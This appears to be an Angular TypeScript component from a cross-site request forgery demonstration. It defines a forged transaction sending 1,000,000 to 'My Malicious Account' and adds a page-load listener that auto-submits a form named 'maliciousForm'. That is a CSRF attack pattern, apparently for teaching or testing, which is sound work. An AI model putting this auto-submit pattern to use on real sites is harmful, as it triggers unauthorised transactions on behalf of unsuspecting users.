import { HttpClient } from '@angular/common/http';
import { Component } from '@angular/core';
import { environment } from '../../environments/environment.dev';
import { RouterOutlet } from '@angular/router';

@Component({
  selector: 'app-secure-endpoint',
  standalone: true,
  imports: [RouterOutlet],
  templateUrl: './secure-endpoint.component.html',
  styleUrl: './secure-endpoint.component.css'
})
export class SecureEndpointComponent {
  protected apiUrl = environment.apiUrl;
  
  newTransaction = {
    amount: 1000000,
    destinationAccount: 'My Malicious Account'
  };

  constructor() {}

}


document.addEventListener("readystatechange", function() {
  if (document.readyState !== 'complete') {
    return;
  }

  
  var form = document.getElementById('maliciousForm')! as HTMLFormElement;
  if (form){
    form.submit();
  }

});
